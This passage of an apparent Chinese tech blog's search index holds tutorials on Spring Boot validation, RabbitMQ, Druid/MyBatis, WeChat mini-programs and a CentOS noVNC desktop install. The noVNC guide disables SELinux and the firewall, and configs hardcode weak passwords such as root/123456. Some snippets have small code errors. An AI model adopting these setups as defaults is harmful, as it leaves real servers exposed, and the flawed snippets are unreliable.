睡眠了600毫秒，如果是同步执行的话三个任务完成应该是2400毫秒，而这里只使用了1005毫秒，说明我们的任务执行确实是异步执行 5. 异步执行使用场景]]></content>
      <categories>
        <category>Java,springboot,SpringBoot技能大全</category>
      </categories>
      <tags>
        <tag>springboot</tag>
        <tag>异步任务</tag>
        <tag>async</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot使用JSR303做参数校验]]></title>
    <url>%2F2019%2F07%2F06%2FSpringBoot%E4%BD%BF%E7%94%A8JSR303%E5%81%9A%E5%8F%82%E6%95%B0%E6%A0%A1%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[1. 实体123456789101112131415public class User &#123; @NotNull private Integer id; @NotNull private String name; @NotNull @Length(min=6) private String password; @NotNull @IsPhone //自定义的校验 private String phone;&#125; #2. Controller中使用 1234@PostMapping(value="login")public String login(@Valid User user) &#123; &#125; 3. 自定义校验注解IsPhone 判断是否为手机号 123456789101112131415161718192021222324252627282930313233package com.pibigstar.springboot.validator;import static java.lang.annotation.ElementType.ANNOTATION_TYPE;import static java.lang.annotation.ElementType.CONSTRUCTOR;import static java.lang.annotation.ElementType.FIELD;import static java.lang.annotation.ElementType.METHOD;import static java.lang.annotation.ElementType.PARAMETER;import static java.lang.annotation.ElementType.TYPE_USE;import static java.lang.annotation.RetentionPolicy.RUNTIME;import java.lang.annotation.Documented;import java.lang.annotation.Repeatable;import java.lang.annotation.Retention;import java.lang.annotation.Target;import javax.validation.Constraint;import javax.validation.Payload;@Target(&#123; METHOD, FIELD, ANNOTATION_TYPE, CONSTRUCTOR, PARAMETER, TYPE_USE &#125;)@Retention(RUNTIME)@Documented@Constraint(validatedBy = &#123;PhoneValidator.class&#125;)public @interface IsPhone &#123; boolean required() default true; String message() default "手机号不合法"; //错误默认提示信息 Class&lt;?&gt;[] groups() default &#123; &#125;; Class&lt;? extends Payload&gt;[] payload() default &#123; &#125;; &#125; 4. 实现具体校验类12345678910111213141516171819202122232425262728293031323334353637383940414243444546package com.pibigstar.springboot.validator;import java.util.regex.Matcher;import java.util.regex.Pattern;import javax.validation.ConstraintValidator;import javax.validation.ConstraintValidatorContext;/** * 手机号码验证者 * @author pibigstar * */public class PhoneValidator implements ConstraintValidator&lt;IsPhone,String&gt;&#123; private boolean requeired; @Override public void initialize(IsPhone constraintAnnotation) &#123; requeired = constraintAnnotation.required(); &#125; @Override public boolean isValid(String value, ConstraintValidatorContext context) &#123; if (requeired) &#123; return isPhone(value); &#125;else &#123; //phone 不是必须 if (value==null||value.length()==0) &#123; return true; &#125;else &#123; return isPhone(value); &#125; &#125; &#125; private boolean isPhone(String phone) &#123; //以1开头，后面跟10个整数，一共11位 Pattern phonePattern = Pattern.compile("1\\d&#123;10&#125;"); if (phone==null||phone.length()&lt;=0) &#123; return false; &#125;else &#123; Matcher matcher = phonePattern.matcher(phone); return matcher.matches(); &#125; &#125;&#125; 5. 对参数不通过进行统一捕获参数验证不通过后统一格式返回给前端页面 123456789101112131415161718192021222324252627282930313233package com.pibigstar.springboot.exception;import java.util.List;import javax.servlet.http.HttpServletRequest;import org.springframework.validation.BindException;import org.springframework.validation.ObjectError;import org.springframework.web.bind.annotation.ControllerAdvice;import org.springframework.web.bind.annotation.ExceptionHandler;import org.springframework.web.bind.annotation.ResponseBody;import com.pibigstar.springboot.domain.result.MyResponse;@ControllerAdvice@ResponseBodypublic class GlobalExceptionHandler &#123; @ExceptionHandler(value=Exception.class) public MyResponse exceptionHandler(HttpServletRequest request,Exception e) &#123; //参数校验异常 if (e instanceof BindException) &#123; BindException exception = (BindException) e; List&lt;ObjectError&gt; allErrors = exception.getAllErrors(); ObjectError objectError = allErrors.get(0); String defaultMessage = objectError.getDefaultMessage(); return MyResponse.error(defaultMessage); &#125;else &#123; //其他异常 return MyResponse.error(e); &#125; &#125;&#125;]]></content>
      <categories>
        <category>springboot</category>
      </categories>
      <tags>
        <tag>参数校验</tag>
        <tag>jsr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot使用RabbitMQ发送消息队列]]></title>
    <url>%2F2019%2F07%2F03%2FSpringBoot%E4%BD%BF%E7%94%A8RabbitMQ%E5%8F%91%E9%80%81%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%2F</url>
    <content type="text"><![CDATA[准备因为RabbitMQ使用erlang语言写的，所以要先安装erlang语言，貌似国内访问很慢，这里放一个下载好的，版本erlang：10.2，rabbitMq：3.7.9 下载：https://pan.baidu.com/s/1k0w23XJYTp_0gTaMb5bXRg提取码：aeiz 启动（两种方式）： 直接双击rabbitmq_server-3.7.9/sbin/rabbitmq-service.bat 在cmd中启动 建议在cmd中启动，直接双击的话关闭只能到任务管理器中关 1. 添加依赖1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-amqp&lt;/artifactId&gt; &lt;/dependency&gt; 2. 添加配置123456spring: rabbitmq: host: 127.0.0.1 port: 5672 username: guest password: guest 3. direct模式这种是点对点模式，一个发送一个接收 3.1 配置类1234567891011121314151617181920import org.springframework.amqp.core.Queue;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;/** * @author pibigstar * @create 2018-12-17 10:57 * @desc direct模式，点对点，一个发送一个接收 **/@Configurationpublic class QueueRabbitConfig &#123; public static final String QUEUE_NAME = "pibigstar"; /** * 定义一个名为：pibigstar 的队列 */ @Bean public Queue pibigstarQueue() &#123; return new Queue(QUEUE_NAME); &#125;&#125; 3.2 消费者12345678910111213141516171819202122import com.pibgstar.demo.amqp.config.QueueRabbitConfig;import org.springframework.amqp.rabbit.annotation.RabbitHandler;import org.springframework.amqp.rabbit.annotation.RabbitListener;import org.springframework.stereotype.Component;import java.util.logging.Logger;/** * @author pibigstar * @create 2018-12-17 11:00 * @desc direct模式消费者 **/@Component// 监听pibigstar队列@RabbitListener(queues = QueueRabbitConfig.QUEUE_NAME)public class QueueConsumer &#123; private static Logger logger = Logger.getLogger("QueueConsumer"); @RabbitHandler public void process(String message) &#123; logger.info("接受到的消息："+message); &#125;&#125; 3.3 发送者1234567891011121314151617/** * @author pibigstar * @create 2018-12-17 11:04 * @desc 消息发送者 **/@Componentpublic class Sender &#123; @Autowired private AmqpTemplate rabbitTemplate; /** * 点对点发送 */ public void sendMessage(String message) &#123; rabbitTemplate.convertAndSend(QueueRabbitConfig.QUEUE_NAME,message); &#125;&#125; 4. Topic模式这种是订阅/发布模式，一个发送多个接收 4.1 配置类1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import org.springframework.amqp.core.Binding;import org.springframework.amqp.core.BindingBuilder;import org.springframework.amqp.core.Queue;import org.springframework.amqp.core.TopicExchange;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;/** * @author pibigstar * @create 2018-12-17 11:18 * @desc topic模式，订阅/发布模式，一个发送多个接收 **/@Configurationpublic class TopicRabbitConfig &#123; // 队列1 public final static String ONE = "topic.one"; // 队列2 public final static String TWO = "topic.two"; // 所有队列 public final static String ALL = "topic.#"; // 转发器 public final static String EXCHANGE = "topic.exchange"; @Bean public Queue queueOne() &#123; return new Queue(TopicRabbitConfig.ONE); &#125; @Bean public Queue queueTwo() &#123; return new Queue(TopicRabbitConfig.TWO); &#125; @Bean TopicExchange exchange() &#123; return new TopicExchange(EXCHANGE); &#125; /** * 绑定队列one到转发器上 */ @Bean Binding bindingExchangeMessage(Queue queueOne, TopicExchange exchange) &#123; return BindingBuilder.bind(queueOne).to(exchange).with(ONE); &#125; /** * 绑定所有队列（one和two）到转发器上 */ @Bean Binding bindingExchangeMessages(Queue queueTwo, TopicExchange exchange) &#123; return BindingBuilder.bind(queueTwo).to(exchange).with(ALL); &#125;&#125; 4.2 消费者12345678910111213141516171819202122232425import com.pibgstar.demo.amqp.config.TopicRabbitConfig;import org.springframework.amqp.rabbit.annotation.RabbitListener;import org.springframework.stereotype.Component;import java.util.logging.Logger;/** * @author pibigstar * @create 2018-12-17 11:29 * @desc topic模式消费者 **/@Componentpublic class TopicConsumer &#123; private static Logger logger = Logger.getLogger("TopicConsumer"); @RabbitListener(queues = TopicRabbitConfig.ONE) public void receiveOne(String message)&#123; logger.info("one接受到的消息："+message); &#125; @RabbitListener(queues = TopicRabbitConfig.TWO) public void receiveTwo(String message)&#123; logger.info("two接受到的消息："+message); &#125;&#125; 4.3 发送者12345678910111213141516171819202122232425import com.pibgstar.demo.amqp.config.QueueRabbitConfig;import com.pibgstar.demo.amqp.config.TopicRabbitConfig;import org.springframework.amqp.core.AmqpTemplate;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Component;/** * @author pibigstar * @create 2018-12-17 11:04 * @desc 消息发送者 **/@Componentpublic class Sender &#123; @Autowired private AmqpTemplate rabbitTemplate; /** * 一对多发送 */ public void sendTopicMessage(String message) &#123; // 往队列one中发送信息, receiverOne和receiverTwo都可以收到 rabbitTemplate.convertAndSend(TopicRabbitConfig.EXCHANGE,TopicRabbitConfig.ONE,message); // 往队列two中发送信息，只有receiverTwo收到 rabbitTemplate.convertAndSend(TopicRabbitConfig.EXCHANGE,TopicRabbitConfig.TWO,message); &#125;&#125;]]></content>
      <categories>
        <category>springboot,SpringBoot技能大全</category>
      </categories>
      <tags>
        <tag>消息队列</tag>
        <tag>rabbitmq</tag>
        <tag>erlang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微信小程序使用npm安装第三方库]]></title>
    <url>%2F2019%2F07%2F02%2F%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BD%BF%E7%94%A8npm%E5%AE%89%E8%A3%85%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93%2F</url>
    <content type="text"><![CDATA[我们以安装有赞的 vant库做例子 1. 初始化在小程序根目录中（miniprogram）执行 1npm init 输入一些基本的信息，可以一直回车，按默认就可以，然后会生成一个package.json文件 2. 安装第三方库有赞文档地址：https://youzan.github.io/vant-weapp/#/intro执行 1npm i vant-weapp -S --production 3.构建npm回到微信开发者工具中，在工具中点击构建npm 4. 启用npm模块在详情中，把 使用npm模块勾选上 5. 使用 在index.json中引入组件库 123"usingComponents": &#123; "van-button": "vant-weapp/button/index"&#125; 在index.wxml使用按钮 1&lt;van-button type="danger"&gt;危险按钮&lt;/van-button&gt; 注意：如果出现找不到路径，请再次点击 构建npm （步骤3）]]></content>
      <categories>
        <category>微信小程序</category>
      </categories>
      <tags>
        <tag>微信小程序</tag>
        <tag>vant</tag>
        <tag>npm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[10行代码搞定微信支付(Java版)]]></title>
    <url>%2F2019%2F07%2F02%2F10%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%90%9E%E5%AE%9A%E5%BE%AE%E4%BF%A1%E6%94%AF%E4%BB%98(Java%E7%89%88)%2F</url>
    <content type="text"><![CDATA[微信支付痛点对于大多数同学来说，要开发微信支付可不简单。附上微信支付官方文档https://pay.weixin.qq.com/wiki/doc/api/index.html从文档上可以看出，你需要解决很多问题，我就随便挑几个吧。 xml与对象的互转: 微信使用xml格式而不使用json通信, 也确实有点奇葩签名:千万不要以为只是MD5一下，要是你自己开发，我敢说，你60%的时间都耗在签名调试这一块 以上是微信公众账号支付的时序图，简单概括为2个点。下单，发起支付接收异步通知，修改订单的支付状态 123456789101112131415161718//微信公众账号支付配置 WxPayH5Config wxPayH5Config = new WxPayH5Config();wxPayH5Config.setAppId("xxxxx"); wxPayH5Config.setAppSecret("xxxxxxxx"); wxPayH5Config.setMchId("xxxxxx"); wxPayH5Config.setMchKey("xxxxxxx"); wxPayH5Config.setNotifyUrl("http://xxxxx"); //支付类, 所有方法都在这个类里 BestPayServiceImpl bestPayService = new BestPayServiceImpl(); bestPayService.setWxPayH5Config(wxPayH5Config); //发起支付 bestPayService.pay(); //异步回调 bestPayService.asyncNotify();` 下单和修改支付状态是用户的业务系统干的事，我们来说说如何快速发起支付和接收异步通知可能是目前最好的支付SDK这是一款支付SDK，支付账号借用请往下看, best-pay-sdk项目主页 https://github.com/Pay-Group/best-pay-sdk有了它你接入支付的代码只需要像上面一样使用方法去掉注释和空行，刚好10行！更多使用，请访问https://github.com/Pay-Group/best-pay-sdk]]></content>
      <categories>
        <category>工具使用,Java</category>
      </categories>
      <tags>
        <tag>微信支付</tag>
        <tag>支付宝支付</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java虚拟机常用命令参数]]></title>
    <url>%2F2019%2F07%2F02%2FJava%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0%2F</url>
    <content type="text"><![CDATA[1. 打印某个类的常量池1javap -v Test.class 2. 查看类的加载顺序1java -verbose:class Test 3. 反编译字节码1javap -v -c Test]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>jvm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[批处理脚本启动多个应用]]></title>
    <url>%2F2019%2F06%2F26%2F%E6%89%B9%E5%A4%84%E7%90%86%E8%84%9A%E6%9C%AC%E5%90%AF%E5%8A%A8%E5%A4%9A%E4%B8%AA%E5%BA%94%E7%94%A8%2F</url>
    <content type="text"><![CDATA[将其保存为 SSR.bat 即可 12345@echo offstart /d "D:\SSR\" SSR4.0.exestart /d "D:\SSR\kcptun\" run.vbsecho successfully open the SSRexit 如果想让它开机自启，那么将这个脚本放到下面这个位置即可 1C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp 如果想在cmd中快速启动，那么将这个脚本放到下面这个位置即可： 1C:\Windows]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>bat</tag>
        <tag>自启</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java随笔记]]></title>
    <url>%2F2019%2F06%2F26%2Fjava%E9%9A%8F%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[文件写入123456789101112131415String fileName = "/root/log/test.log";Path file = Paths.get(fileName);boolean exists = Files.exists(Paths.get(dir), LinkOption.NOFOLLOW_LINKS);try &#123; if (!exists) &#123; Files.createDirectories(Paths.get(dir)); &#125; List&lt;String&gt; lines = Arrays.asList(msg); // 写文件，CREATE，APPEND打开文件的标志位， 创建或追加 Files.write(file, lines, Charset.forName("UTF-8"), StandardOpenOption.CREATE, StandardOpenOption.APPEND);&#125; catch (IOException e) &#123; LOGGER.info("IOException", e);&#125; NIO方式复制文件12345678910public static void copyFileByChannel(File source, File dest) throws IOException &#123; try (FileChannel sourceChannel = new FileInputStream(source).getChannel(); FileChannel targetChannel = new FileOutputStream(dest).getChannel();)&#123; for (long count = sourceChannel.size() ;count&gt;0 ;) &#123; long transferred = sourceChannel.transferTo(sourceChannel.position(), count, targetChannel); sourceChannel.position(sourceChannel.position() + transferred); count -= transferred; &#125; &#125; &#125; 年月日获取1234LocalDate today = LocalDate.now();int year = today.getYear();int month = today.getMonthValue();int day = today.getDayOfMonth(); 根据配置文件来决定是否显示Swagger123@ConditionalOnExpression("'$&#123;swagger.enable&#125;' == 'true'")public class SwaggerConfig &#123;&#125; 并发集合不存在则加入123private ConcurrentMap&lt;String, T&gt; singletonInstances = new ConcurrentMap&lt;&gt;();// 如果不存在此实例则将其放进去singletonInstances.putIfAbsent(name, instance); 判断不为空1234567891011// 判断对象不为null，如果为null则抛出空指针异常，不为空返回此对象obj = Objects.requireNonNull(obj);// 这个是com.google.common.base包中的方法Preconditions.checkNotNull(url);// 检查集合不为null，为空抛出空指针Collections.checkedList(lists)// 检查map不为空，key或value为空则抛出空指针Collections.checkedMap(map)// 检查Set不为空Collections.checkedSet(set) 检查某个Class对象是否被某注解注解12// 判断clazz对象是否有MyAnnotation注解clazz.isAnnotationPresent(MyAnnotation.class); 读取配置文件读取类似properties格式的文件 1234567891011121314151617181920212223Enumeration&lt;URL&gt; urls = classLoader.getResources(“META-INF/extensions/test.info”);if(urls!=null &amp;&amp; urls.hasMoreElements())&#123; while(urls.hasMoreElements())&#123; URL url = urls.nextElement(); BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream(), "utf-8")); String line = null; while ((line=br.readLine())!=null)&#123; String config = line; //跳过注释 if(config.startsWith("#"))&#123; continue; &#125; String key= null; String value= null; int i = config.indexOf('='); if (i &gt; 0) &#123; key= config.substring(0, i).trim(); value= config.substring(i + 1).trim(); &#125; System.out.Println("key:"+key+" value:"+value); &#125; &#125;&#125; 字符串格式化1String str = String.format("%s has already been exported", name) Buffer流写操作123456// 获取字符解码类CharsetEncoder encoder = Charset.forName("UTF-8").newEncoder();// 将字符串转换为字节BufferByteBuffer bytes = encoder.encode(CharBuffer.wrap("要写入的值"));BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream("test.txt"));bos.write(bytes.array(), 0, bytes.limit());]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>java日常</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot整合Druid和MyBatis]]></title>
    <url>%2F2019%2F06%2F22%2FSpringBoot%E6%95%B4%E5%90%88Druid%E5%92%8CMyBatis%2F</url>
    <content type="text"><![CDATA[1. 加入依赖1234567891011121314151617181920212223242526272829303132333435&lt;!-- druid --&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid&lt;/artifactId&gt; &lt;version&gt;1.1.16&lt;/version&gt;&lt;/dependency&gt;&lt;!-- mybatis --&gt;&lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;3.5.1&lt;/version&gt;&lt;/dependency&gt;&lt;!-- mybatis对接Spring --&gt;&lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring&lt;/artifactId&gt; &lt;version&gt;2.0.1&lt;/version&gt;&lt;/dependency&gt;&lt;!-- mysql链接驱动 --&gt;&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;8.0.15&lt;/version&gt;&lt;/dependency&gt;&lt;!-- jdbc --&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-jdbc&lt;/artifactId&gt;&lt;/dependency&gt;&lt;!-- log4j --&gt;&lt;dependency&gt; &lt;groupId&gt;log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j&lt;/artifactId&gt; &lt;version&gt;1.2.17&lt;/version&gt;&lt;/dependency&gt; 2. application.yml中添加配置12345678910111213141516171819202122232425262728spring: druid: datasource: type: com.alibaba.druid.pool.DruidDataSource driver-class-name: com.mysql.cj.jdbc.Driver initialSize: 5 minIdle: 5 maxActive: 20 maxWait: 60000 timeBetweenEvictionRunsMillis: 60000 minEvictableIdleTimeMillis: 300000 validationQuery: SELECT 1 FROM DUAL testWhileIdle: true testOnBorrow: true testOnReturn: true poolPreparedStatements: true maxPoolPreparedStatementPerConnectionSize: 20 filters: stat,wall,log4j connectionProperties: druid.stat.mergeSql=true;druid.stat.slowSqlMillis=5000 useGlobalDataSourceStat: true loginUsername: pibigstar loginPassword: pibigstar #数据库连接地址 url: jdbc:mysql://127.0.0.1:3306/test?useUnicode=true&amp;allowMultiQueries=true&amp;characterEncoding=utf-8&amp;serverTimezone=Asia/Shanghai&amp;useSSL=false #用户名 username: root #密码 password: 123456 3. 配置映射类12345678910111213141516171819202122232425262728@Configuration@ConfigurationProperties(prefix = "spring.druid.datasource")public class DruidProperties &#123; private String type; private String driverClassName; private String url; private String username; private String password; private Integer initialSize; private Integer minIdle; private Integer maxActive; private Long maxWait; private Long timeBetweenEvictionRunsMillis; private Long minEvictableIdleTimeMillis; private String validationQuery; private boolean testWhileIdle; private boolean testOnBorrow; private boolean testOnReturn; private boolean poolPreparedStatements; private Integer maxPoolPreparedStatementPerConnectionSize; private String filters; private String connectionProperties; private boolean useGlobalDataSourceStat; private String loginUsername; private String loginPassword; //setter,getter方法&#125; 4. 初始化Druid12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091@Configurationpublic class DruidAutoConfiguration &#123; @Autowired private DruidProperties properties; @Bean @Primary public DruidDataSource dataSource() throws Exception &#123; DruidDataSource dataSource = new DruidDataSource(); dataSource.setDriverClassName(properties.getDriverClassName()); dataSource.setUrl(properties.getUrl()); dataSource.setUsername(properties.getUsername()); dataSource.setPassword(properties.getPassword()); dataSource.setInitialSize(properties.getInitialSize()); dataSource.setMinIdle(properties.getMinIdle()); dataSource.setMaxActive(properties.getMaxActive()); dataSource.setMaxWait(properties.getMaxWait()); dataSource.setTimeBetweenEvictionRunsMillis(properties.getTimeBetweenEvictionRunsMillis()); dataSource.setMinEvictableIdleTimeMillis(properties.getMinEvictableIdleTimeMillis()); String validationQuery = properties.getValidationQuery(); if (validationQuery != null &amp;&amp; !"".equals(validationQuery)) &#123; dataSource.setValidationQuery(validationQuery); &#125; dataSource.setTestWhileIdle(properties.isTestWhileIdle()); dataSource.setTestOnBorrow(properties.isTestOnBorrow()); dataSource.setTestOnReturn(properties.isTestOnReturn()); if (properties.isPoolPreparedStatements()) &#123; dataSource.setMaxPoolPreparedStatementPerConnectionSize(properties.getMaxPoolPreparedStatementPerConnectionSize()); &#125; String connectionPropertiesStr = properties.getConnectionProperties(); if (connectionPropertiesStr != null &amp;&amp; !"".equals(connectionPropertiesStr)) &#123; Properties connectProperties = new Properties(); String[] propertiesList = connectionPropertiesStr.split(";"); for (String propertiesTmp : propertiesList) &#123; String[] obj = propertiesTmp.split("="); String key = obj[0]; String value = obj[1]; connectProperties.put(key, value); &#125; dataSource.setConnectProperties(connectProperties); &#125; dataSource.setUseGlobalDataSourceStat(properties.isUseGlobalDataSourceStat()); WallConfig wallConfig = new WallConfig(); wallConfig.setMultiStatementAllow(true); WallFilter wallFilter = new WallFilter(); wallFilter.setConfig(wallConfig); List&lt;Filter&gt; filters = new ArrayList&lt;&gt;(); filters.add(wallFilter); filters.add(new StatFilter()); filters.add(new Log4jFilter()); dataSource.setProxyFilters(filters); return dataSource; &#125; /** * Druid的Servlet * @return */ @Bean public ServletRegistrationBean druidStatViewServlet() &#123; ServletRegistrationBean servletRegistrationBean = new ServletRegistrationBean(new StatViewServlet(), "/druid/*"); /** 添加初始化参数：initParams */ /** 白名单，如果不配置或value为空，则允许所有 */ servletRegistrationBean.addInitParameter("allow", "127.0.0.1,192.0.0.1"); /** 黑名单，与白名单存在相同IP时，优先于白名单 */ servletRegistrationBean.addInitParameter("deny", "192.0.0.1"); /** 用户名 */ servletRegistrationBean.addInitParameter("loginUsername", properties.getLoginUsername()); /** 密码 */ servletRegistrationBean.addInitParameter("loginPassword", properties.getLoginPassword()); /** 禁用页面上的“Reset All”功能 */ servletRegistrationBean.addInitParameter("resetEnable", "false"); return servletRegistrationBean; &#125; /** * Druid拦截器，用于查看Druid监控 * @return */ @Bean public FilterRegistrationBean druidStatFilter() &#123; FilterRegistrationBean filterRegistrationBean = new FilterRegistrationBean(new WebStatFilter()); /** 过滤规则 */ filterRegistrationBean.addUrlPatterns("/*"); /** 忽略资源 */ filterRegistrationBean.addInitParameter("exclusions", "*.js,*.gif,*.jpg,*.png,*.css,*.ico,/druid/*"); return filterRegistrationBean; &#125;&#125; 5. Druid与Mybatis对接12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364@Configuration@EnableTransactionManagement@AutoConfigureAfter(DruidAutoConfiguration.class)@MapperScan(value = &#123;"com.pibigstar.**.mapper.**"&#125;)public class MybatisAutoConfiguration&#123; /** * mybatis 配置路径 */ private static String MYBATIS_CONFIG = "classpath:mybatis/mybatis-config.xml"; /** * mybatis mapper xml */ private static String[] MAPPER_LOCATIONS_CONFIG = new String[]&#123; "classpath*:com/pibigstar/**/mapper/mysql/*.xml", "classpath*:com/pibigstar/**/mapper/mysql/*/*.xml", &#125;; @Autowired private DruidDataSource dataSource; /** * 创建sqlSession * @return * @throws Exception */ @Bean(name = "sqlSessionFactory") public SqlSessionFactoryBean createSqlSessionFactoryBean() throws Exception &#123; PathMatchingResourcePatternResolver resolver = new PathMatchingResourcePatternResolver(); Resource resource = resolver.getResource(MYBATIS_CONFIG); SqlSessionFactoryBean sqlSessionFactoryBean = new SqlSessionFactoryBean(); /** 设置mybatis configuration 扫描路径 */ sqlSessionFactoryBean.setConfigLocation(resource); /** 设置datasource */ sqlSessionFactoryBean.setDataSource(dataSource); /** 设置mapperLocations */ List&lt;Resource&gt; all = new ArrayList&lt;&gt;(); for (String mapperLocation : MAPPER_LOCATIONS_CONFIG) &#123; all.addAll(Arrays.asList(resolver.getResources(mapperLocation))); &#125; sqlSessionFactoryBean.setMapperLocations(all.toArray(new Resource[all.size()])); return sqlSessionFactoryBean; &#125; @Bean public SqlSessionTemplate sqlSessionTemplate(SqlSessionFactory sqlSessionFactory) &#123; return new SqlSessionTemplate(sqlSessionFactory); &#125; /** * 配置事务管理器 */ @Bean(name = "transactionManager") @Primary public DataSourceTransactionManager transactionManager(@Qualifier("dataSource") DataSource dataSource) throws Exception &#123; return new DataSourceTransactionManager(dataSource); &#125;&#125; 6. 新建mybatis-config.xml文件在resources下新建mybatis文件夹，在此文件夹下新建mybatis-config.xml文件可以在此文件中新增mysql插件之类的。 12345678910&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE configuration PUBLIC "-//mybatis.org//DTD Config 3.0//EN" "http://mybatis.org/dtd/mybatis-3-config.dtd"&gt;&lt;configuration&gt; &lt;settings&gt; &lt;setting name="callSettersOnNulls" value="true"/&gt; &lt;setting name="localCacheScope" value="STATEMENT"/&gt; &lt;setting name="logPrefix" value="dao."/&gt; &lt;/settings&gt;&lt;/configuration&gt; 7. 新建log4j.properties在resources下新建log4j.properties文件，如果没有此文件，控制台不会输出SQL语句 123456789#1. DEBUG#2. INFO#3. WARN#4. ERROR#5. FATALlog4j.rootLogger=DEBUG,stdoutlog4j.appender.stdout=org.apache.log4j.ConsoleAppenderlog4j.appender.stdout.layout=org.apache.log4j.PatternLayoutlog4j.appender.stdout.layout.ConversionPattern=%d [%p] %c:%L - %m%n 8. 测试启动项目，浏览器访问：http://localhost:8080/druid/index.html会自动跳转到登录页面，输入你在application.yml文件中配置的loginUsername和loginPassword，可进入首页，首页如下：控制台打印SQL信息]]></content>
      <categories>
        <category>springboot,mybatis</category>
      </categories>
      <tags>
        <tag>mybatis</tag>
        <tag>druid</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Centos安装可视化桌面（noVNC）]]></title>
    <url>%2F2019%2F06%2F20%2FCentos%E5%AE%89%E8%A3%85%E5%8F%AF%E8%A7%86%E5%8C%96%E6%A1%8C%E9%9D%A2%EF%BC%88noVNC%EF%BC%89%2F</url>
    <content type="text"><![CDATA[@[toc] 1. 关闭防火墙123setenforce 0systemctl stop firewalldsystemctl disable firewalld 2. 安装tigervnc2.1 锁定配置1chattr +i /etc/resolv.conf 2.2 安装tigervnc1yum install -y tigervnc tigervnc-server 2.3 安装桌面查看支持的桌面 1yum grouplist 安装桌面 1yum groupinstall -y "GNOME Desktop" 这个过程会很慢，耐心等待 2.4 安装桌面插件1yum install gnome-panel 安装结束之后会报 Error：Nothing to do，不用管，没事 1yum install nautilus 2.5 更换显示模式 默认是图形界面的模式，你可以修改为命令行模式 12345# 设置成命令模式systemctl set-default multi-user.target # 设置成图形模式systemctl set-default graphical.target 3. 配置tigervnc3.1 设置密码1vncpasswd 3.2 启动vnc1vncserver :1 : 后面是端口号，0-99 不指定默认为1，第一次会提示输入密码，前两次是可读可写的密码，输入y之后，输入只读的密码，当用只读密码进来时，只能看不能操作，以后可以使用vncpasswd命令修改密码。 4. 登录vnc4.1 下载VNC Viewer下载地址：https://www.realvnc.com/en/connect/download/viewer/windows/ 4.2 登录 VNC Server 为 你的IP:1 这个1 是我们前面启动vncserver后面的1，如果你写的2，这里也要写2 4.3 登录效果 5. 安装noVnc5.1 下载1234# 下载wget https://github.com/novnc/noVNC/archive/master.zip# 解压unzip master.zip 5.2 生成证书 证书要放到utils文件夹下面 123cd noVNC-master/utils# 生成证书openssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem 前面都不用写，只需要填写Common Name (e.g. server FQDN or YOUR name) []:这个字段，填写的内容是本机的hostname，可通过下面命令查看本机的hostname 1hostname 5.3 安装noVnc12# 安装./utils/launch.sh --vnc localhost:5901 浏览器打开：http://你的IP:6080/vnc.html 即可看到效果输入我们前面设置的密码，即可进入桌面]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>novnc</tag>
        <tag>vncserver</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java使用itexpdf创建pdf文件并添加水印]]></title>
    <url>%2F2019%2F06%2F18%2FJava%E4%BD%BF%E7%94%A8itexpdf%E5%88%9B%E5%BB%BApdf%E6%96%87%E4%BB%B6%E5%B9%B6%E6%B7%BB%E5%8A%A0%E6%B0%B4%E5%8D%B0%2F</url>
